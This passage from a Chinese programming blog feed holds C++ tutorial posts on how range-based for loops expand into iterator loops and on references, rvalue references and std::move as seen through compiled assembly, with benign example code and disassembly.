class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Iterator</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Iterator <span class="title">end</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Iterator</span>(arr + size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Container container;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> element : container)</span><br><span class="line">        std::cout &lt;&lt; element &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写这样的类可以让我们更加清晰的认识到范围 for 循环是如何转换为传统 for 循环的，分析这个转换流程，我们就可得出自己实现的类需要满足什么条件才能用于范围 for 循环：</p><ol><li>有一个内部类 <strong>Iterator</strong> 作为迭代器</li><li>迭代器实现操作符重载，包括以下操作符<code>*，!=，++</code></li><li><strong>Container</strong> 类内置<code>begin()</code>和<code>end()</code>函数，且两者返回该容器的迭代器</li></ol><p>其中需要特别注意的是，迭代器的<code>++</code>运算符需要重载的是前置自增，也就是<code>++iterator</code>，如上面示例中所示，否则编译器马上就会报错</p><p>后置自增重载是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iterator <span class="keyword">operator</span>++(<span class="type">int</span>) &#123; <span class="comment">// 小括号里有个int表示后置自增</span></span><br><span class="line">    iterator temp = *<span class="keyword">this</span>;</span><br><span class="line">    ++ptr;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实在没有翻阅书籍前，我对传统 for 循环的猜测是这样的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> beg = v.<span class="built_in">begin</span>(); beg != v.<span class="built_in">end</span>(); ++beg) &#123;</span><br><span class="line">    <span class="keyword">auto</span> &amp;r = *beg; <span class="comment">// r 必须是引用类型，这样才能对元素执行写操作</span></span><br><span class="line">    r *= <span class="number">2</span>; <span class="comment">// 将v中每个元素的值翻倍</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到了吗，关于 <code>end()</code>函数我把它移到了循环条件的位置。乍一看这样想也挺正确，写个代码验证以下就行了，为了方便我拿 <code>std::vector</code> 容器做演示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">end</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> r : v) &#123;</span><br><span class="line"><span class="keyword">if</span> (r == <span class="number">0</span>)</span><br><span class="line">v.<span class="built_in">erase</span>(it);</span><br><span class="line">std::cout &lt;&lt; r &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码大概的意思是：</p><ol><li>用列表初始化的方式定义了一个<code>std::vector</code>变量 <strong>v</strong>，其包含 4 个元素</li><li>定义了一个迭代器 <strong>it</strong>，指向了容器的最后一个元素 <strong>4</strong></li><li>进入循环的第一步就是将容器最后一个元素 <strong>4</strong> 擦除</li><li>然后依次输出容器内的各个元素</li></ol><p>如果按照我的之前的猜测，这段代码的结果应该只是<code>0 1 2 3</code>，因为每次循环条件都会重新判断，第一次循环后 <code>v.end()</code>就已经减一，输出 <strong>3</strong> 之后应该就会停止。</p><p>但事实并非如此，实际上它还将 <strong>4</strong> 输出了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Running] cd &quot;d:\cppcode&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;d:\cppcode&quot;test</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">[Done] exited with code=0 in 1.176 seconds</span><br></pre></td></tr></table></figure><p>这也侧面体现出了范围 for 循环转换后的传统 for 循环就是书上的这种。</p><p>按照书上的这种，程序在循环时对 <code>end</code> 的判断是具有延时性的，它不是实时的，这也因此表现出了范围 for 循环的不安全性。</p><p>书上在后面提到，如果我们使用了范围 for 循环，我们不应该在循环体内对容器进行添加或删除操作。或者说一个更广泛的问题，在定义一个迭代器后，我们在使用这个迭代器的期间不应该对容器执行添加或删除。</p><p>以<code>vector</code>容器为例，<code>vector</code>之所以能够实现动态数组，就是依赖于一种算法，根据当前容器的<code>size</code>来适当的申请和释放内存。如果我们在定义了一个 <code>iterator</code>后往容器添加数据，这个<code>vector</code>可能会释放当前存储元素的空间，换个更大的空间来存储。那么这时<code>iterator</code>指向的就是一个被释放后不应该被利用的地址，对这块内存空间进行操作无疑是十分危险的。</p><p><strong>原版</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt;&amp; <span class="title">getRange</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;get vector range...&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> val :v)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>C++ Insights</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt; v = std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt;&#123;std::initializer_list&lt;<span class="type">int</span>&gt;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;, std::<span class="built_in">allocator</span>&lt;<span class="type">int</span>&gt;()&#125;;</span><br><span class="line">std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt; &amp; <span class="built_in">getRange</span>()</span><br><span class="line">&#123;</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;(std::cout, <span class="string">&quot;get vector range...&quot;</span>).<span class="keyword">operator</span>&lt;&lt;(std::endl);</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt; &amp; __range1 = v;</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">int</span> *, std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt; &gt; __begin1 = __range<span class="number">1.</span><span class="built_in">begin</span>();</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">int</span> *, std::vector&lt;<span class="type">int</span>, std::allocator&lt;<span class="type">int</span>&gt; &gt; &gt; __end1 = __range<span class="number">1.</span><span class="built_in">end</span>();</span><br><span class="line">    <span class="keyword">for</span>(; __gnu_cxx::<span class="keyword">operator</span>!=(__begin1, __end1); __begin<span class="number">1.</span><span class="keyword">operator</span>++()) &#123;</span><br><span class="line">      <span class="type">int</span> val = __begin<span class="number">1.</span><span class="keyword">operator</span>*();</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;(std::cout.<span class="keyword">operator</span>&lt;&lt;(val), <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  std::cout.<span class="keyword">operator</span>&lt;&lt;(std::endl);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++中的引用和移动语义</title>
      <link href="/2024/09/08/C++%E4%B8%AD%E7%9A%84%E5%BC%95%E7%94%A8%E5%92%8C%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89/"/>
      <url>/2024/09/08/C++%E4%B8%AD%E7%9A%84%E5%BC%95%E7%94%A8%E5%92%8C%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<p><strong>引用</strong>是C++基于C语言新提出的一个概念，很多教科书或者网上都说引用是变量的一个别名。但是，这种说法未免有些太玄乎了，这样引出了很多问题，引用本身是一个变量吗，它会占据内存空间吗等等，这些问题使得引用变得更加玄乎了。</p><p>为了深入了解引用，我决定在汇编中寻找答案，毕竟汇编才是C&#x2F;C++的根本。</p><p>话不多说，直接给出例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* p = &amp;x;</span><br><span class="line">    *p = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span>&amp; ref = x;</span><br><span class="line">    ref = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        </span><br><span class="line">        ; int x = 0</span><br><span class="line">        mov     DWORD PTR [rbp-20], 0 ; [rbp-20]为x</span><br><span class="line">        </span><br><span class="line">        ; int* p = &amp;x</span><br><span class="line">        lea     rax, [rbp-20]</span><br><span class="line">        mov     QWORD PTR [rbp-8], rax ; [rbp-8]为p</span><br><span class="line">        ; *p = 5</span><br><span class="line">        mov     rax, QWORD PTR [rbp-8]</span><br><span class="line">        mov     DWORD PTR [rax], 5</span><br><span class="line">        </span><br><span class="line">        ; int&amp; ref = x</span><br><span class="line">        lea     rax, [rbp-20]</span><br><span class="line">        mov     QWORD PTR [rbp-16], rax ; [rbp-16]为ref</span><br><span class="line">        ; ref = 10</span><br><span class="line">        mov     rax, QWORD PTR [rbp-16]</span><br><span class="line">        mov     DWORD PTR [rax], 10</span><br><span class="line">        </span><br><span class="line">        ; return 0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        </span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>在这个例子中我先定义了一个指针<code>p</code>指向变量<code>x</code>，解引用该指针去修改<code>x</code>的值；然后定义了一个引用<code>ref</code>，用引用取修改<code>x</code>的值。就做了两套相同的事情，定义然后修改。如果看得懂一些汇编，就能够发现指针和引用的定义以及用法竟然是一样一样的。于是我们得出了一个结论：<strong>引用的本质就是指针</strong>。</p><p>为了更好的理解，写一个等效<code>C++</code>代码吧</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span>&amp; ref = x; <span class="comment">// int* const ref = &amp;x</span></span><br><span class="line">ref = <span class="number">5</span>; <span class="comment">// *ref = 5</span></span><br></pre></td></tr></table></figure><p>定义一个引用实际上就是在定义一个指针，这样写的好处就是能够省略很多<strong>声明符</strong>。注意到，为什么等效代码会有<code>const</code>呢，其实在汇编代码中<code>const</code>的性质并不会体现出来，它是给编译器看的，仅仅通过汇编我们很难反推出等效的C++代码到底有没有<code>const</code>。但是，想想我们在C++中是如何使用引用的，是不是直接用引用名<code>ref</code>，这样其实就是类似于<code>*ref</code>，并不是修改<code>ref</code>本身的内存空间，而是修改<code>ref</code>引用的那个内存空间，也就是变量<code>x</code>。通过C++代码是很难去动<code>ref</code>内存里的值，也就很难改动<code>ref</code>的指向，这样不也侧面说明了这个<code>const</code>了吗。</p><p>以上就是传统意义上引用的本质，在其它语言上也可以这么解释。</p><p>但是，在C++中，为了配合左值和右值，将引用分为了<strong>左值引用</strong>和<strong>右值引用</strong>。其中左值引用就是上面讲的，那么右值引用又是什么东西呢？</p><p>为了更好的解释这两个引用，需要知道什么是左值，什么是右值。</p><p>网上说可以取地址的对象就是左值，反之则是右值。说的很有道理，但是我认为还没有说到点上，因为严格来说不管怎么样我们写的任何代码任何数据最终都是在内存里的，凭什么说有的能取址，有的不能取地址。你说<code>int x = 10</code>中这个<code>10</code>是右值因为它不能取地址，真要说起来，（以下是示例）这条代码转为汇编指令不就是<code> mov DWORD PTR [rbp-0x4],0xa</code>吗，对应机器指令就是<code>c7 45 fc 0a 00 00 00</code>，将其存储在内存里，我同样能对<code>0a 00 00 00</code>这4个字节进行寻址和取址。所以用这种方式定义左值和右值难免有些矛盾。</p><p>所以这是我对左值和右值做出一个笼统且感性的概念：</p><ul><li>左值：一个对象，或者说一片内存空间，只不过这片内存空间可以让程序员能够在C++代码中用一个明确的<strong>标识符</strong>表示出来，基本上这片可标识的内存空间除了不在<code>.txt</code>代码段其它段都可以存在</li><li>右值：同样是一个对象，一片内存空间，但是这片内存空间程序员不能够用一个明确的<strong>标识符</strong>在C++代码表示出来，程序员自然也就不能用C++操作这片空间。这片内存空间可能存在于<code>.txt</code>代码段、栈空间甚至是寄存器中。比如说一个常量<code>10</code>、一个临时对象，我们都不能在C++代码中用一个标识符来表示这块空间吧。</li></ul><p>请注意，上面说的<strong>标识符</strong>都是从程序员的角度，基于C++代码层面上定义。并不是编译器基于汇编代码层面的，对于编译器来说不管是左值还是右值对象的内存空间位置都是了如指掌的，是全知全能的，所以我们不应该看编译器来定义左值右值。</p><p>有了这个概念后让我们来看一下一个简单的右值引用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>&amp;&amp; ref = <span class="number">10</span>;</span><br><span class="line">ref = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>右值引用从语法上只是比左值引用多了一个<code>&amp;</code>符号，其引用的对象是一个右值。但是，前面说过，引用本质上是个指针，现在这个指针指向<code>10</code>，而这个<code>10</code>其实是存在于代码区的，难道我们可以操控代码区了？这无疑于C++往自己身上绑了颗定时炸弹，C++的设计者当然不会允许这种事情发生。这背后到底发生了什么，看看汇编就知道了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; int&amp;&amp; ref = 10</span><br><span class="line">mov     DWORD PTR [rbp-12], 10</span><br><span class="line">lea     rax, [rbp-12]</span><br><span class="line">mov     QWORD PTR [rbp-8], rax</span><br><span class="line"></span><br><span class="line">; ref = 5</span><br><span class="line">mov     rax, QWORD PTR [rbp-8]</span><br><span class="line">mov     DWORD PTR [rax], 5</span><br></pre></td></tr></table></figure><p> 不难发现，这套逻辑与前面的左值引用可以说非常相似，甚至是一模一样。就是最开始的一行多了一段<code>mov     DWORD PTR [rbp-12], 10</code>，这是为什么？前面说了，原来的<code>10</code>存与代码区，是万万不能动的，为了能够在C++中正常使用这个引用，编译器特地把<code>10</code>移到了栈当中，即<code>[rbp-12]</code>，然后令<code>ref</code>指向这个地址，这个引用的定义也就完成了。从这里不难看出，右值引用的本质其实与左值引用别无二样，只有在最开始选择引用的对象不同的罢了（一个是左值，一个是右值）。</p><p>值得注意的是，这个右值引用在被定义后，被引用的对象其实是个左值，也就是说引用变量<code>ref</code>被定义后<code>*ref</code>（等效代码，实际是正常使用就是<code>ref=5</code>这样的）是一个左值。为什么？结合前面左值右值的定义，现在<code>ref</code>指向的那个对象，那片内存空间，在C++代码中已经可以用<code>ref</code>来表示了，程序员可以用一个特定的标识符来操作那片空间，所以此后<code>ref</code>指向的对象就是一个左值。</p><p>什么？你说右值引用不应该引用的的是一个右值吗？是的，右值引用在最开始<strong>想要</strong>引用一个右值，但是受现实所迫，它在最后又去引用了一个左值。</p><p>右值，一开始基本上被认为是一个常量，我们不应该去修改它，比如说<code>10 = 5;</code>这样的代码就很诡异吧。所以在<code>C++11</code>提出右值引用之前，都是用被<code>const</code>修饰的左值引用去引用右值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line">ref = <span class="number">5</span>; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p>汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     DWORD PTR [rbp-12], 10</span><br><span class="line">lea     rax, [rbp-12]</span><br><span class="line">mov     QWORD PTR [rbp-8], rax</span><br></pre></td></tr></table></figure><p>与前面右值引用时完全一模一样的。不同的是我们不能在C++代码中去修改它了。</p><p>那么，右值引用这个新概念的提出又有什么用呢？在接下来 **移动语义（move semantics）**中它会有大作用。</p><p>在这之前，先聊聊平常又简单的概念：<strong>强制类型转换</strong></p><p>我们知道在等号赋值时，等号右边表达式结果的类型必须与等号左边表达式的类型相同才能赋值，否则在<code>Visual Studio 2022</code>中它就会报以下错：<code>&quot;某某&quot;类型的值不能用于初始化&quot;某某&quot;类型的实体</code></p><p>比如说下面这样是不行的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span>* p = &amp;x;</span><br><span class="line"><span class="type">int</span> y = p; <span class="comment">// error: &quot;int *&quot;类型的值不能用于初始化&quot;int&quot;类型的实体</span></span><br></pre></td></tr></table></figure><p>但是我们改成这样就可以了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span>* p = &amp;x;</span><br><span class="line"><span class="type">int</span> y = (<span class="type">int</span>)p; <span class="comment">// 做一个强制类型转换</span></span><br></pre></td></tr></table></figure><p>这里的转换我是在<code>x86</code>的环境下做的，指针的大小与<code>int</code>类型相同都是4个字节。如果在<code>x64</code>环境下注意把<code>int</code>改为<code>long long</code>，否则会报丢失精度的错误。</p><p>看下汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;int x = 3</span><br><span class="line">005B185F  mov         dword ptr [ebp-0Ch],3  </span><br><span class="line"></span><br><span class="line">;int* p = &amp;x</span><br><span class="line">005B1866  lea         eax,[ebp-0Ch]  </span><br><span class="line">005B1869  mov         dword ptr [ebp-18h],eax  </span><br><span class="line"></span><br><span class="line">;int y = (int)p</span><br><span class="line">005B186C  mov         eax,dword ptr [ebp-18h]  </span><br><span class="line">005B186F  mov         dword ptr [ebp-24h],eax</span><br></pre></td></tr></table></figure><p>一般情况下的强制类型转换无非也<strong>就是把改变一个数据的解读方式，数据的值依然视不变（不考虑长类型变短类型的精度丢失）</strong>，至少在C语言中都是这样的</p><p>你可能会说<code>int x = 3.14;</code>我这样做也是正确的，那是因为编译器帮你做了一个<strong>隐式类型转换</strong>，它实际上是<code>int x = (int)3.14;</code>至少从结果上来说都是<code>mov DWORD PTR [rbp-4], 3</code>，把小数点后面的数都砍掉了</p><p>也许你已经注意到了，难道我们上面写的左值引用和右值引用也是<strong>隐式类型转换</strong>吗？是的，没错</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span>&amp; ref1 = x;</span><br><span class="line"><span class="type">int</span>&amp; ref2 = (<span class="type">int</span>&amp;)x;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     DWORD PTR [rbp-20], 5</span><br><span class="line"></span><br><span class="line">lea     rax, [rbp-20]</span><br><span class="line">mov     QWORD PTR [rbp-8], rax</span><br><span class="line"></span><br><span class="line">lea     rax, [rbp-20]</span><br><span class="line">mov     QWORD PTR [rbp-16], rax</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>&amp;&amp; ref1 = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; ref2 = (<span class="type">int</span>&amp;&amp;)<span class="number">10</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     DWORD PTR [rbp-20], 10</span><br><span class="line">lea     rax, [rbp-20]</span><br><span class="line">mov     QWORD PTR [rbp-8], rax</span><br><span class="line"></span><br><span class="line">mov     DWORD PTR [rbp-24], 10</span><br><span class="line">lea     rax, [rbp-24]</span><br><span class="line">mov     QWORD PTR [rbp-16], rax</span><br></pre></td></tr></table></figure><p>你会发现，不管我有没有显式写出强制类型转换，它们最后的汇编代码都是一样的。结合上面所说的，编译会做出适当的隐式类型转换</p><p>但是又出现了一个问题，前面的强制类型转换都是数据数值的迁移，比如说<code>int y = (int)p </code>至少从数值上来说它们是相等的，这里引用的类型转换竟然并不是数据的迁移，<strong>而是将目标的地址迁移了过去</strong>，也就是说从<code>mov</code>变成了<code>lea</code>。</p><p>这是为什么呢？从C++设计者的角度来看，他就是为了实现<code>int&amp; ref = x</code>这个简单的语法，实现用<code>ref</code>就像在用<code>x</code>本身一样，而<code>ref</code>本质上又是个指针，到时候操作<code>ref</code>的时候会自动的解引用<code>ref</code>内存中存储的地址。如果，这里在定义<code>ref</code>时，<code>x</code>的类型转换还是像C语言中那样简单的把<code>x</code>的数值迁移过去，那<code>ref</code>指向<code>x</code>的意义就完全没有了，<code>ref</code>就像个野指针一样，那么引用概念的提出也就完全没有意义了。由此，只能去改变编译器的行为了。新概念的提出需要做出新的规则，这也能理解，不过这也是C++变得如此臃肿的原因之一。</p><p>说了这么多，到底移动语义是什么呢，且看下面的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; ref = (<span class="type">int</span>&amp;&amp;)x;</span><br></pre></td></tr></table></figure><p>像这样就是一个移动语义了，将<strong>一个左值强制转换为一个右值引用(指针)<strong>这就是</strong>移动语义</strong>，怎么样是不是很简单。只不过为了使这样的语法更具有规范性，可以使其适用于任何类型，比如所有的基本数据类型和自定义类。C++提供了一个模板函数<code>std::move()</code>，于是上面的写法就可以改写成这样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; ref = std::<span class="built_in">move</span>(x);</span><br></pre></td></tr></table></figure><p>这个函数就会返回一个强制类型转换<code>x</code>为右值引用的变量（存储了<code>x</code>的地址，是个右值），类似于这样吧（我猜的，有错误请指正</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>&amp;&amp; <span class="title">move</span><span class="params">(<span class="type">int</span>&amp; x)</span> <span class="comment">// move的作用仅仅只是做一步强制类型转换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>&amp;&amp;)x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span>&amp;&amp; ref = <span class="built_in">move</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 